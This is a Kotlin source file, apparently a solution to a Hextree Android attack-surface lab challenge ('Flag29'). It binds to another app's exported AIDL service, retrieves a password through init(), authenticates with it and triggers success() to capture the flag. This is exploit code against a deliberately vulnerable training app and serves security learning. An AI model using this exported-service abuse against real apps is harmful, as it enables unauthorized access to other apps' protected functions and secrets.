package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.IBinder
import android.util.Log
import io.hextree.attacksurface.services.IFlag29Interface

object Flag29 {
    fun getFlag(context: Context) {
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag29Service"
            )
        }

        val mConnection = object : ServiceConnection {
            override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                Log.d("Fla29", "service connected")
                val remoteService = IFlag29Interface.Stub.asInterface(service)
                try {
                    Log.d("Flag29", "Initializing...")
                    val password = remoteService.init()
                    Log.d("Flag29", "Got Password: $password")

                    Log.d("Flag29", "Authenticating...")
                    remoteService.authenticate(password)
                    Log.d("Flag29", "Authenticated")

                    Log.d("Flag29", "Calling success")
                    remoteService.success()
                    Log.d("Flag29", "Check app")

                } catch (e: Error) {
                    Log.e("Flag29", e.message.toString())
                }
            }

            override fun onServiceDisconnected(name: ComponentName?) {
                Log.d("Fla29", "service disconnected")
            }
        }
        context.bindService(intent, mConnection, Context.BIND_AUTO_CREATE)
    }
}
